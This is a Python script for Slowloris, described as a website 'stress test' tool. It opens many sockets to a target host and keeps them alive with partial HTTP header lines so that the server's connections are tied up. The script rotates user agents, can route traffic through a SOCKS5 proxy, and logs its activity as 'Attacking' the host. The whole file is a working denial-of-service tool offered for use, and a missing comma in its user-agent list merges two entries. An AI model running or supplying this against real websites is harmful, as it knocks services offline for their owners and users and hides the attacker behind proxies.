#!/usr/bin/python
import argparse
import logging
import random
import socket
import ssl
import sys
import time

parser = argparse.ArgumentParser(description="Slowloris, low bandwidth stress test tool for websites")
parser.add_argument('host', nargs="?", help="Host to preform stress test on")
parser.add_argument('-p', '--port', default=80, help="Port of webserver, usually 80", type=int)
parser.add_argument('-s', '--sockets', default=150, help="Number of sockets to use in the test", type=int)
parser.add_argument('-v', '--verbose', dest="verbose", action="store_true", help="Increases logging")
parser.add_argument('-ua', '--randuseragents', dest="randuseragent", action="store_true", help="Randomizes user-agents with each request")
parser.add_argument('-x', '--useproxy', dest="useproxy", action="store_true", help="Use a SOCKS5 proxy for connecting")
parser.add_argument('--proxy-host', default="127.0.0.1", help="SOCKS5 proxy host")
parser.add_argument('--proxy-port', default="8080", help="SOCKS5 proxy port", type=int)
parser.add_argument("--https", dest="https", action="store_true", help="Use HTTPS for the requests")
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

if args.useproxy:
    # Tries to import to external "socks" library
    # and monkey patches socket.socket to connect over
    # the proxy by default
    try:
        import socks
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("Socks Proxy Library Not Available!")

if args.verbose:
    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
else:
    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)

list_of_sockets = []
user_agents = [
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    if args.https:
        s = ssl.wrap_socket(s)

    s.connect((ip, args.port))

    request = (
        "GET / HTTP/1.1\r\n"
        + "Host: {}\r\n".format(ip)
        + ("User-Agent: {}\r\n".format(random.choice(user_agents)) if args.randuseragent else "User-Agent: {}\r\n".format(user_agents[0]))
        + "Content-Length: 42\r\n"
    )

    s.send(request.encode("utf-8"))
    return s

def main():
    ip = args.host
    socket_count = args.sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Creating sockets...")
    start_time = time.time()

    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = init_socket(ip)
            if s:
                s.send("X-a: b\r\n".encode("utf-8"))
                list_of_sockets.append(s)
        except socket.error:
            break

    interval = 100.0
    elapsed_time = time.time() - start_time
    sleep_time = max(0, 100 - elapsed_time)
    time.sleep(sleep_time)
    next_cycle = time.time()

    while True:
        logging.info("Sending keep-alive headers... Socket count: %s", len(list_of_sockets))

        for s in list(list_of_sockets):
            try:
                s.send("X-a: b\r\n".encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)

        for _ in range(socket_count - len(list_of_sockets)):
            logging.debug("Recreating socket...")
            try:
                s = init_socket(ip)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break

        next_cycle += interval
        sleep_time = max(0, round(next_cycle - time.time(), 6))
        logging.debug("Sleeping for %.6f seconds", sleep_time)
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()